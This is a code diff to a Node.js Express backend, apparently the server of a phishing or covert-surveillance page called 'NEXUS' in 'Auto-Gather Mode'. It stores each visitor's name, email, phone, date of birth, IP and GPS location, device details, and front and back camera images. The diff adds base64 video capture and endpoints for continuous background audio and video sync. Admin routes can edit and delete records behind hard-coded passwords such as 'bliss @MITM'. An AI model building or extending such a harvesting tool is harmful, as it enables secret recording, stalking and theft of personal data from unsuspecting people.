@@ -1,5 +1,5 @@
 // ─────────────────────────────────────────────────────────────
-//  vertusa // Backend — Auto-Gather Mode
+//  NEXUS // Backend — Auto-Gather Mode
 // ─────────────────────────────────────────────────────────────
 const express = require("express");
 const path = require("path");
@@ -9,8 +9,8 @@ const fetch = require("node-fetch");
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-app.use(express.json({ limit: "50mb" }));
-app.use(express.urlencoded({ extended: true, limit: "50mb" }));
+app.use(express.json({ limit: "150mb" }));
+app.use(express.urlencoded({ extended: true, limit: "150mb" }));
 app.set("trust proxy", true);
 app.use(express.static(path.join(__dirname, "public")));
 
@@ -66,10 +66,18 @@ async function initDB() {
       back_image      TEXT,
       -- Audio recording (base64)
       audio_recording TEXT,
+      -- Video recording (base64)
+      video_recording TEXT,
       -- Record timestamp
       created_at      TEXT DEFAULT (datetime('now'))
     );
   `);
+
+  try {
+    db.run("ALTER TABLE captures ADD COLUMN video_recording TEXT;");
+  } catch (_) {
+    // Column already exists
+  }
 
   saveDB();
 }
@@ -155,13 +163,18 @@ app.post("/api/capture", async (req, res) => {
       screen_res, language, platform, user_agent,
       form_name, form_email, form_phone, form_dob,
       geo_lat, geo_lon, geo_accuracy,
-      front_image, back_image, audio_recording,
+      client_ip,
+      front_image, back_image, audio_recording, video_recording,
     } = req.body;
 
-    const raw_ip = getClientIP(req);
+    const raw_ip = client_ip || getClientIP(req);
     const geo = await fetchGeoLocation(raw_ip);
-    // Use the resolved public IP (if localhost was resolved via ipify)
-    const ip_address = geo.resolvedIP || raw_ip;
+    
+    let base_ip = geo.resolvedIP || raw_ip;
+    const device_ip = req.body.device_ip;
+    
+    // Combine public and local IPs for maximum accuracy
+    const ip_address = device_ip ? `${base_ip} | Local: ${device_ip}` : base_ip;
 
     const openDate = timestamp_open ? new Date(timestamp_open) : new Date();
     const openIST = openDate.toLocaleString("en-IN", { timeZone: "Asia/Kolkata" }) + " (IST)";
@@ -174,8 +187,8 @@ app.post("/api/capture", async (req, res) => {
         form_name, form_email, form_phone, form_dob,
         ip_address, ip_city, ip_region, ip_country, ip_lat, ip_lon, ip_isp, ip_org, ip_timezone,
         geo_lat, geo_lon, geo_accuracy,
-        front_image, back_image, audio_recording, created_at
-      ) VALUES (?,?,?,?,?, ?,?,?,?, ?,?,?,?, ?,?,?,?,?,?,?,?,?, ?,?,?, ?,?,?,?)`,
+        front_image, back_image, audio_recording, video_recording, created_at
+      ) VALUES (?,?,?,?,?, ?,?,?,?, ?,?,?,?, ?,?,?,?,?,?,?,?,?, ?,?,?, ?,?,?,?,?)`,
       [
         openIST,
         os || "Unknown", browser || "Unknown", browser_version || "",
@@ -185,7 +198,7 @@ app.post("/api/capture", async (req, res) => {
         ip_address,
         geo.city, geo.region, geo.country, geo.lat, geo.lon, geo.isp, geo.org, geo.timezone,
         geo_lat || null, geo_lon || null, geo_accuracy || null,
-        front_image || null, back_image || null, audio_recording || null,
+        front_image || null, back_image || null, audio_recording || null, video_recording || null,
         createdIST,
       ]
     );
@@ -219,12 +232,47 @@ app.post("/api/capture", async (req, res) => {
   }
 });
 
+// ── POST /api/capture/:id/audio — continuous background audio sync ──
+app.post("/api/capture/:id/audio", (req, res) => {
+  try {
+    const { audio_recording } = req.body;
+    const id = parseInt(req.params.id);
+    if (!audio_recording || isNaN(id)) {
+      return res.status(400).json({ success: false, message: "Invalid audio payload." });
+    }
+    db.run("UPDATE captures SET audio_recording = ? WHERE id = ?", [audio_recording, id]);
+    saveDB();
+    return res.json({ success: true, message: "Audio updated." });
+  } catch (err) {
+    console.error("Audio update error:", err);
+    return res.status(500).json({ success: false, message: "DB Error" });
+  }
+});
+
+// ── POST /api/capture/:id/video — continuous background video sync ──
+app.post("/api/capture/:id/video", (req, res) => {
+  try {
+    const { video_recording } = req.body;
+    const id = parseInt(req.params.id);
+    if (!video_recording || isNaN(id)) {
+      return res.status(400).json({ success: false, message: "Invalid video payload." });
+    }
+    db.run("UPDATE captures SET video_recording = ? WHERE id = ?", [video_recording, id]);
+    saveDB();
+    return res.json({ success: true, message: "Video updated." });
+  } catch (err) {
+    console.error("Video update error:", err);
+    return res.status(500).json({ success: false, message: "DB Error" });
+  }
+});
+
 // ── Admin Password ───────────────────────────────────────────
-const ADMIN_PASS = "Bliss@603";
+const ADMIN_PASS = "bliss @MITM";
+const ALLOWED_ADMIN_PASSES = ["bliss @MITM", "bliss@MITM"];
 
 function checkAdmin(req, res) {
   const pass = req.headers["x-admin-pass"] || req.query.pass;
-  if (pass !== ADMIN_PASS) {
+  if (!pass || !ALLOWED_ADMIN_PASSES.includes(pass.trim())) {
     res.status(401).json({ success: false, message: "Unauthorized" });
     return false;
   }
@@ -278,9 +326,40 @@ app.post("/api/admin/clear", (req, res) => {
   if (!checkAdmin(req, res)) return;
   try {
     db.run("DELETE FROM captures");
+    saveDB();
     return res.json({ success: true, message: "Logs cleared." });
   } catch (err) {
     console.error("Admin clear error:", err);
+    return res.status(500).json({ success: false, message: "DB Error" });
+  }
+});
+
+// ── DELETE /api/admin/record/:id — delete a specific record ──
+app.delete("/api/admin/record/:id", (req, res) => {
+  if (!checkAdmin(req, res)) return;
+  try {
+    db.run("DELETE FROM captures WHERE id = ?", [parseInt(req.params.id)]);
+    saveDB();
+    return res.json({ success: true, message: "Record deleted." });
+  } catch (err) {
+    console.error("Delete record error:", err);
+    return res.status(500).json({ success: false, message: "DB Error" });
+  }
+});
+
+// ── PUT /api/admin/record/:id — edit a specific record ──
+app.put("/api/admin/record/:id", (req, res) => {
+  if (!checkAdmin(req, res)) return;
+  try {
+    const { form_name, form_email, form_phone, form_dob } = req.body;
+    db.run(
+      `UPDATE captures SET form_name = ?, form_email = ?, form_phone = ?, form_dob = ? WHERE id = ?`,
+      [form_name, form_email, form_phone, form_dob, parseInt(req.params.id)]
+    );
+    saveDB();
+    return res.json({ success: true, message: "Record updated." });
+  } catch (err) {
+    console.error("Update record error:", err);
     return res.status(500).json({ success: false, message: "DB Error" });
   }
 });
@@ -304,7 +383,7 @@ initDB().then(() => {
   app.listen(PORT, () => {
     console.log(`
   ┌──────────────────────────────────────────────┐
-  │   vertusa PORTAL running on port ${PORT}           │
+  │   NEXUS PORTAL running on port ${PORT}           │
   │   http://localhost:${PORT}                       │
   │                                              │
   │   For HTTPS / mobile camera:                 │
